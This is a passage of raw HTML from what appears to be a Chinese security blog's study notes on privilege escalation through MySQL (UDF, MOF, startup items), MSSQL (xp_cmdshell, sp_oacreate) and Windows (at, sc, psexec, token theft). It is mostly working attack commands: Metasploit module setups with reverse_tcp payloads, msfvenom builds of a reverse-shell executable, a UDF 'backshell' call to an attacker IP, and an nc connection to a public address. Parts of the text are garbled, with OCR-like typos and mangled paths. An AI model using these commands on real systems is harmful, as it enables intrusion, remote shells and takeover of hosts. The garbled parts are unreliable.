class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>、通过注入点<br>sqlmap.py-D mysql -T user -C <span class="hljs-string">&quot;password&quot;</span><br></code></pre></td></tr></table></figure><h6 id="1-通过注入点"><a href="#1-通过注入点" class="headerlink" title="1.通过注入点"></a>1.通过注入点</h6><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs clean">```<br><br>###### <span class="hljs-number">2.</span>通过文件<br><br></code></pre></td></tr></table></figure><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>###### <span class="hljs-number">3.</span>网站配置文件<br><br></code></pre></td></tr></table></figure><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### MYSQL-UDF提权<br><br>```php<br>UDF (Userdefined function)可翻译为用户自定义函数，<br>其为mysql的一个拓展接口，<br>可以为mysql增添一些函数。<br>比如mysql一些函数没有，我就使用UDF加入一些函数进去，那么我就可以在mysql中使用这个函数了。<br></code></pre></td></tr></table></figure><h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">数据库的最高权限用户的密码<br>secure-file-priv没进行目录限制  <span class="hljs-comment">//能够写入dll文件</span><br></code></pre></td></tr></table></figure><h5 id="开启外连"><a href="#开启外连" class="headerlink" title="开启外连"></a>开启外连</h5><h6 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">修改mysql中user表数据<br></code></pre></td></tr></table></figure><h6 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27;IDENTIFIED BY&#x27;root&#x27; WITH GRANT OPTION;<br>GRANT ALL PRIVILEGES ON *.* TO &#x27;账号&#x27;@&#x27;%&#x27;IDENTIFIED BY&#x27;密码&#x27; WITH GRANT OPTION;<br>-- 这是一条MySQL授权语句，<br>用于授予指定用户在所有数据库和表上拥有所有权限，并且可以在任何主机上连接到MySQL服务器<br></code></pre></td></tr></table></figure><h5 id="查版本"><a href="#查版本" class="headerlink" title="查版本"></a>查版本</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">select <span class="hljs-title function_ invoke__">version</span>() <span class="hljs-comment">#查版本</span><br>seTect @@basedir <span class="hljs-comment">#查安装路径</span><br>UDF导入函澈的文件为dll类型，其存放的目录受版本影响如下:<br><span class="hljs-number">1</span>.mysql&lt;<span class="hljs-number">5.2</span>    dll导出目录c:/windows或system32<br><span class="hljs-number">2</span>.mysql&gt;=<span class="hljs-number">5.2</span>   dll导出安装目录/lib/plugin/<br>  <br>没有目录采用手工创建plugin目录<br></code></pre></td></tr></table></figure><p><img src="/image/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230516165917.png" alt="微信截图_20230516165917"></p><h5 id="调用MSF"><a href="#调用MSF" class="headerlink" title="调用MSF"></a>调用MSF</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">使用MSF中的exploit/multi/mysql/mysql_udf_payload 模块可以进行UDF提权,<br>MSF会将d11文件写入<span class="hljs-number">1</span>ib plugin\目录下(前提是该目录存在，需手工创建)该d11文件中包含<span class="hljs-title function_ invoke__">sys_exec</span>(和sys_eva10两个函数，<br><span class="hljs-keyword">use</span> exploit/multi/mysql/mysql_udf_payload<br>set password root<br>set rhosts <span class="hljs-number">192.168</span>.<span class="hljs-number">1.15</span><br>run<br>成功生成DLL后，可在fuc表下查询<br></code></pre></td></tr></table></figure><h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">上面默认只创建<span class="hljs-title function_ invoke__">sys_exec</span>()函数，该函数执行并不会有回显。我们可以手动创建 <span class="hljs-title function_ invoke__">sys_eva1</span>() 函数，来执行有回显的命令<br><span class="hljs-comment">//2.创建函数绑定dll</span><br>create <span class="hljs-function"><span class="hljs-keyword">function</span> &lt;函数名&gt; <span class="hljs-title">returns</span> <span class="hljs-title">string</span> <span class="hljs-title">soname</span> &quot;&lt;<span class="hljs-title">dll</span>文件名&gt;&quot;</span>;<br>create <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sys_eval</span> <span class="hljs-title">returns</span> <span class="hljs-title">string</span> <span class="hljs-title">soname</span> &quot;<span class="hljs-title">KaMeVAyW</span>.<span class="hljs-title">dll</span>&quot;</span>;<br><br>DROP FUNCTION &lt;function_name&gt; <span class="hljs-comment">#删除自定义函数</span><br><span class="hljs-comment">//3.调用函数进行命令执行</span><br>select <span class="hljs-title function_ invoke__">sys_eval</span>(<span class="hljs-string">&quot;whoami&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="MYSQL-MSF启动项提权"><a href="#MYSQL-MSF启动项提权" class="headerlink" title="MYSQL-MSF启动项提权"></a>MYSQL-MSF启动项提权</h3><h5 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 原理：上传木马到启动项文件，当电脑重启的时候，启动项文件被触发，实现上线。</span><br>高权限账户<br>secure-fle-priv <span class="hljs-comment">// </span><br></code></pre></td></tr></table></figure><h5 id="MSF配置"><a href="#MSF配置" class="headerlink" title="MSF配置"></a>MSF配置</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mysql">MSF：（前提先开外链）<br>use exploit/windows/mysql/mysql_start_up<br>set payload windows/meterpreter/reverse_tcp<br>set rhosts 192.168.88.131<br>set username root<br>set password root<br>set AllowNoCleanup  true<br>run<br></code></pre></td></tr></table></figure><h3 id="MYSQL-MSF反弹shell"><a href="#MYSQL-MSF反弹shell" class="headerlink" title="MYSQL-MSF反弹shell"></a>MYSQL-MSF反弹shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mysql">use mysql;<br>set @a=concat(&#x27;&#x27;,0x4d5a....);<br>create table Ghost(data LONGBLOB);<br>insert into Ghost values(&quot;&quot;);update Ghost set data = @a;<br>select data from Ghost into DUMPFILE &#x27;E:\\app\\php\\PHPTutorial\\MySQL\\lib\\plugin\\udf.dll&#x27;;<br><br>攻击机：<br>create function backshell returns string soname &#x27;udf.dll&#x27;;<br>select backshell(&#x27;192.168.234.133&#x27;,8888)  -- kali攻击机的IP<br></code></pre></td></tr></table></figure><h3 id="MYSQL-MOF提权"><a href="#MYSQL-MOF提权" class="headerlink" title="MYSQL-MOF提权"></a>MYSQL-MOF提权</h3><h5 id="原理及条件"><a href="#原理及条件" class="headerlink" title="原理及条件"></a>原理及条件</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 利用了c:/windows/system32/wbem/mof/目录下的 nullevt.mof 文件，每分钟都会在一个特定的时间去执行一次的特性，写入我们的cmd命令使其被带入执行，从而添加新用户提权。</span><br>测试的主机上该目录下并没有该mof文件，<br>因此我们直接导入一个文件。<br>当然这里需要权限，一般来说MOF普通用户是无法执行操作的，即使是拿到了一个shell.<br>也只是普通权限用户，利用条件有些苛刻。<br>MOF提权的条件要求十分严苛:<br><span class="hljs-number">1</span>.windows <span class="hljs-number">03</span>及以下版本<br><span class="hljs-number">2</span>.mysql有读写 c:/windows/system32/wbem/mof 的权限<br><span class="hljs-number">3</span>.secure_file_priv没进行目录限制<br></code></pre></td></tr></table></figure><h5 id="上传MOF文件"><a href="#上传MOF文件" class="headerlink" title="上传MOF文件"></a>上传MOF文件</h5><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-title">.mof文件</span><br></code></pre></td></tr></table></figure><h5 id="执行语句"><a href="#执行语句" class="headerlink" title="执行语句"></a>执行语句</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> load_file(<span class="hljs-string">&quot;c:/nullevt.mof&quot;</span>) into dumpfile<span class="hljs-string">&quot;c:/windows /system32 /wbem/mof/nullevt .mof&quot;</span>这里不能使用outfile，因为会在末端写入新行，因此mof在被当作二进制文件无法正常执行.所以我们用dumpfile导出一行数据<br>该文件效果创建一个高权限用户 (从上面脚本可知账号密码为 mofmof)net user username /deTete 删除用户删不掉<br><span class="hljs-comment"># 停止 winmgmt 服务</span><br>372971<br>net stop winmgmt<br><span class="hljs-comment"># 删除 Repository 文件夹</span><br><span class="hljs-built_in">rmdir</span> /s /q C: windows system32 wbem Repository# 手动删除 mof 文件de1 c: windows system32 wbem mof good nullevt.mof /F /s# 删除创建的用户net user mofmof /delete<br><span class="hljs-comment">#重新启动服务</span><br>net start winmgmt<br></code></pre></td></tr></table></figure><h5 id="MSF实现"><a href="#MSF实现" class="headerlink" title="MSF实现"></a>MSF实现</h5><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs clean">```<br><br>### MSSQL<br><br>##### xp cmdshell提权<br><br>```php<br>账号密码: sa/admin<br><span class="hljs-comment">// xp_cmdshe11默认在mssq12000中是开启的，在mssq12005之后的版本中则默认禁止。</span><br>如果用户拥有管理员sa权限则可以用sp configure重修开启它。<br></code></pre></td></tr></table></figure><h5 id="直接利用"><a href="#直接利用" class="headerlink" title="直接利用"></a>直接利用</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># EXEC master.dbo.xp_cmdshell &#x27;whoami&#x27;<br>EXEC master.dbo.xp_cmdshell &#x27;命令&#x27;<br></code></pre></td></tr></table></figure><h5 id="如果被关闭了"><a href="#如果被关闭了" class="headerlink" title="如果被关闭了"></a>如果被关闭了</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mysql">-- 启用：<br>EXEC sp_configure &#x27;show advanced options&#x27;, 1<br>RECONFIGURE;<br>EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;<br>RECONFIGURE;<br><br>-- 相应的关闭命令为关闭：<br><br>exec sp_configure &#x27;show advanced options&#x27;, 1;<br>reconfigure;<br>exec sp_configure &#x27;xp_cmdshell&#x27;, 0;<br>reconfigure;<br></code></pre></td></tr></table></figure><h5 id="如果被删除了"><a href="#如果被删除了" class="headerlink" title="如果被删除了"></a>如果被删除了</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sql">```<br><br>##### sp_oacreate提权<br><br>```php<br>主要是用来调用OLE对象，利用OLE对象的run方法执行系统命令。启用:<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>，<span class="hljs-number">1</span>;RECONFIGURE <span class="hljs-keyword">WITH</span> OVERRIDE:<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;ole Automation Procedures&#x27;</span>，<span class="hljs-number">1</span>;RECONFIGURE <span class="hljs-keyword">WITH</span> OVERRIDE:<br>关闭:<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>，<span class="hljs-number">1</span>;RECONFIGURE <span class="hljs-keyword">WITH</span> OVERRIDE:<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;ole Automation Procedures&#x27;</span>，<span class="hljs-number">0</span>;RECONFIGURE <span class="hljs-keyword">WITH</span> OVERRIDE:<br>执行:<br><span class="hljs-keyword">declare</span> <span class="hljs-variable">@shel1</span> <span class="hljs-type">int</span> <span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">&#x27;wscript,shel1&#x27;</span>,<span class="hljs-variable">@shel1</span> output <span class="hljs-keyword">exec</span> sp_oamethod<span class="hljs-variable">@she11</span>,<span class="hljs-string">&#x27;run&#x27;</span>,nul1,<span class="hljs-string">&#x27;c: windows system32 cmd.exe /c whoami &gt;c:  1.txt&#x27;</span><br></code></pre></td></tr></table></figure><h5 id="SOL-Server-沙盒提权"><a href="#SOL-Server-沙盒提权" class="headerlink" title="SOL Server 沙盒提权"></a>SOL Server 沙盒提权</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">exec sp_configureshow advanced <span class="hljs-keyword">options</span> ,<span class="hljs-number">1</span>;reconfigure;exec sp_configure <span class="hljs-string">&#x27;Ad Hoc Distributed Queries&#x27;</span>,<span class="hljs-number">1</span>;reconfigure;<br><span class="hljs-comment">--关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码。</span><br>exec master ..xp_regwriteHKEY-LOCAL_MACHIN<span class="hljs-string">E&#x27;,&#x27;</span>SOFTWARE Microsoft Jet <span class="hljs-number">4.0</span> Engines<span class="hljs-string">&#x27; , &#x27;</span>sandBoxMod<span class="hljs-string">e&#x27; ,&#x27;</span>REG_DWORD<span class="hljs-string">&#x27;,0:</span><br><span class="hljs-string">--查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句。</span><br><span class="hljs-string">exec master .dbo .xp_regread&#x27;</span>HKEY_LOCAL_MACHIN<span class="hljs-string">E&#x27;SOFTWARE Microsoft Jet 4.0 Engines &#x27;</span>sandBoxMod<span class="hljs-string">e&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><h5 id="MDUT"><a href="#MDUT" class="headerlink" title="MDUT"></a>MDUT</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs PHP">https:<span class="hljs-comment">//github.com/SafeGroceryStore/MDUT</span><br></code></pre></td></tr></table></figure><h5 id="LiqunKit"><a href="#LiqunKit" class="headerlink" title="LiqunKit"></a>LiqunKit</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs PHP">综合高危漏洞利用工具(包含各大数据库) https:<span class="hljs-comment">//github.com/Liqunkit/LiqunKit</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全技术</tag>
      
      <tag>学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>权限提升win</title>
    <link href="/2022/09/14/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87win/"/>
    <url>/2022/09/14/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87win/</url>
    
    <content type="html"><![CDATA[<h2 id="提权面试"><a href="#提权面试" class="headerlink" title="提权面试"></a>提权面试</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">进入系统后，首先信息收集，查看当前用户名，网卡，补丁，系统信息，系统版本，然后通过获取的系统版本信息进行手工提权，如果是系统版本是<span class="hljs-number">2000</span>，<span class="hljs-number">2003</span>，xp就可以用at系统自带的命令提权，<br>  windows <span class="hljs-number">7</span>、<span class="hljs-number">8</span>、<span class="hljs-number">03</span>、<span class="hljs-number">08</span>、<span class="hljs-number">12</span>、<span class="hljs-number">16</span>可以用sc命令，<br>  适用版本: win2012 &amp; win2008 &amp; Win2016<br>全自动的提权，CS插件，MSF<br></code></pre></td></tr></table></figure><h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php">win/linux/数据库<br><span class="hljs-comment">// 目的: 获取更高级的权限。---》 做更多高权限相关操作</span><br><br>提权路径<br>--》后台权限 --》系统权限<br>--》web权限  --》系统权限<br>--》数据库   --》系统权限<br>--》中间件   --》系统权限<br>  <br>win最高权限：system<br>linux最高权限：root<br></code></pre></td></tr></table></figure><h4 id="常见权限获取方法"><a href="#常见权限获取方法" class="headerlink" title="常见权限获取方法"></a>常见权限获取方法</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">后台权限:SQL注入，数据库备份泄露，默认或弱口令等获取帐号密码进入<br>网站权限:后台提升至网站权限，RCE或文件操作类、反序列化等漏洞直达shell<br>数据库权限:SQL注入,数据库备份泄露，默认或弱口令等进入或网站权限获取后转入<br>接口权限:SQL注入,数据库备份泄露，源码泄漏，培植不当等或网站权限获取后转入<br>系统权限:高危系统漏洞直达或网站权限提升转入，数据库权限提升转入，第三方转入等<br>域控权限:高危系统漏洞直达或内网横向渗透转入，域控其他服务安全转入等<br></code></pre></td></tr></table></figure><h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">```<br><br>![微信截图_20230510160433](image/微信截图_20230510160433.png)<br><br>#### 基础信息获取<br><br>```php<br>当前权限             whoami /priv<br>操作系统版本《位数)   ver<br>漏洞补丁/杀软        systeminfo<br>网络连接状态         tasklist /svg      netstat -ano<br></code></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">https:<span class="hljs-comment">//github.com/k8gege/Ladon     工具</span><br>https:<span class="hljs-comment">//github.com/Ascotbe/KernelHub</span><br>https:<span class="hljs-comment">//github.com/nomi-sec/PoC-in-GitHub</span><br>https:<span class="hljs-comment">//github.com/offensive-security/exploitdb</span><br>http:<span class="hljs-comment">//cve.mitre.org/data/refs/refmap/source-MS.html</span><br></code></pre></td></tr></table></figure><h3 id="msf全自动提权"><a href="#msf全自动提权" class="headerlink" title="msf全自动提权"></a>msf全自动提权</h3><h4 id="查看session"><a href="#查看session" class="headerlink" title="查看session"></a>查看session</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sessions</span><br></code></pre></td></tr></table></figure><h4 id="找系统安装的补丁"><a href="#找系统安装的补丁" class="headerlink" title="找系统安装的补丁"></a>找系统安装的补丁</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">background  <span class="hljs-comment">//放后台 看session的编号</span><br><span class="hljs-keyword">use</span> <span class="hljs-title">post</span>/<span class="hljs-title">windows</span>/<span class="hljs-title">gather</span>/<span class="hljs-title">enum_patches</span>    <br><span class="hljs-title">set</span> <span class="hljs-title">sessions</span> 32<br><span class="hljs-title">run</span><br></code></pre></td></tr></table></figure><h4 id="全自动命令"><a href="#全自动命令" class="headerlink" title="全自动命令"></a>全自动命令</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">background  <span class="hljs-comment">//放后台 看session的编号</span><br><span class="hljs-keyword">use</span> <span class="hljs-title">post</span>/<span class="hljs-title">multi</span>/<span class="hljs-title">recon</span>/<span class="hljs-title">local_exploit_suggester</span><br><span class="hljs-title">set</span> <span class="hljs-title">session</span> 32<br><span class="hljs-title">set</span> <span class="hljs-title">showdescription</span> <span class="hljs-title">true</span><br><span class="hljs-title">run</span><br>//找出有用的一个一个试试<br><span class="hljs-title">use</span> <span class="hljs-title">exploit</span>/<span class="hljs-title">windows</span>/<span class="hljs-title">local</span>/<span class="hljs-title">ms16_075_reflection_juicy</span><br><span class="hljs-title">set</span> <span class="hljs-title">session</span> 32<br><span class="hljs-title">run</span>  // 即可成功提权<br></code></pre></td></tr></table></figure><h3 id="CS提权"><a href="#CS提权" class="headerlink" title="CS提权"></a>CS提权</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">右键，插件有权限提升<br></code></pre></td></tr></table></figure><h3 id="手工提权"><a href="#手工提权" class="headerlink" title="手工提权"></a>手工提权</h3><h3 id="WIN-AT命令提权"><a href="#WIN-AT命令提权" class="headerlink" title="WIN-&gt;AT命令提权"></a>WIN-&gt;AT命令提权</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 系统自带命令</span><br>适合版本：<span class="hljs-comment">// Win2000 &amp; Win2003 &amp; XP中还是存在的，在Win7以后被剔除.</span><br>at <span class="hljs-number">14</span>:<span class="hljs-number">10</span> /interactive <span class="hljs-title function_ invoke__">cmd</span><br>(在<span class="hljs-number">14</span>:<span class="hljs-number">30</span>分生成一个交互式的System权限的cmd)<br></code></pre></td></tr></table></figure><h3 id="WIN-SC命令"><a href="#WIN-SC命令" class="headerlink" title="WIN-&gt;SC命令"></a>WIN-&gt;SC命令</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 系统自带命令</span><br>windows <span class="hljs-number">7</span>、<span class="hljs-number">8</span>、<span class="hljs-number">03</span>、<span class="hljs-number">08</span>、<span class="hljs-number">12</span>、<span class="hljs-number">16</span><br><span class="hljs-comment">#创建一个名叫syscmd的新的交互式的cmd执行服务</span><br>sc Create syscmd binPath= <span class="hljs-string">&quot;cmd /K start&quot;</span> type= own type= interact<br>sc Create &lt;服务名称&gt;  binPath=<span class="hljs-string">&quot;cmd /K start&quot;</span>  type= own type= interact<br><br><span class="hljs-comment">#运行服务</span><br>sc start syscmd<br>sc start &lt;服务名称&gt;<br></code></pre></td></tr></table></figure><h3 id="WIN-PS命令提权"><a href="#WIN-PS命令提权" class="headerlink" title="WIN-&gt;PS命令提权"></a>WIN-&gt;PS命令提权</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 手到下载上传</span><br><span class="hljs-number">1</span>.<span class="hljs-comment">// 适用版本: win2012 &amp; win2008 &amp; Win2016</span><br>https:<span class="hljs-comment">//docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</span><br>运行：<br>psexec.exe -accepteula -s -i -d cmd <span class="hljs-comment">#调用运行cmd</span><br></code></pre></td></tr></table></figure><p><img src="/image/1-16837861584191.png" alt="1"></p><h3 id="WIN-进程迁移"><a href="#WIN-进程迁移" class="headerlink" title="WIN-&gt;进程迁移"></a>WIN-&gt;进程迁移</h3><h5 id="pinjector-exe"><a href="#pinjector-exe" class="headerlink" title="pinjector.exe"></a>pinjector.exe</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">pinjector.exe工具<br>pinjector -l<br>pinjector -p <span class="hljs-number">436</span> cmd <span class="hljs-number">1111</span><br>nc <span class="hljs-number">43.138</span>.<span class="hljs-number">215.2</span> <span class="hljs-number">1111</span><br><br>Ps:nc -<span class="hljs-number">1</span> <span class="hljs-number">1111</span>监听端口<br></code></pre></td></tr></table></figure><h5 id="msf进程迁移"><a href="#msf进程迁移" class="headerlink" title="msf进程迁移"></a>msf进程迁移</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>.生成木马并运行<br>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="hljs-number">192.168</span>.<span class="hljs-number">234.133</span> LPORT=<span class="hljs-number">3333</span> -f exe -o msf.exe<br>set Iport/Thost/payload<br>  <span class="hljs-comment">// payload =windows/meterpreter/reverse_tcp</span><br>run<br><br><span class="hljs-number">2</span>.权限迁移 <br>ps     <span class="hljs-comment">//查看进程</span><br>migrate PID       <span class="hljs-comment">//迁移对应PID</span><br></code></pre></td></tr></table></figure><h3 id="WIN-令牌窃取提权"><a href="#WIN-令牌窃取提权" class="headerlink" title="WIN-&gt;令牌窃取提权"></a>WIN-&gt;令牌窃取提权</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">令牌窃取 Win2008 Win2012 阿里云服务器<br>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="hljs-number">192.168</span>.<span class="hljs-number">234.133</span> LPORT=<span class="hljs-number">3333</span> -f exe -o msf.exe<br>set Iport/Thost/payload<br>wrun<br></code></pre></td></tr></table></figure><h5 id="本地权限"><a href="#本地权限" class="headerlink" title="本地权限"></a>本地权限</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">meterpreter &gt;  <span 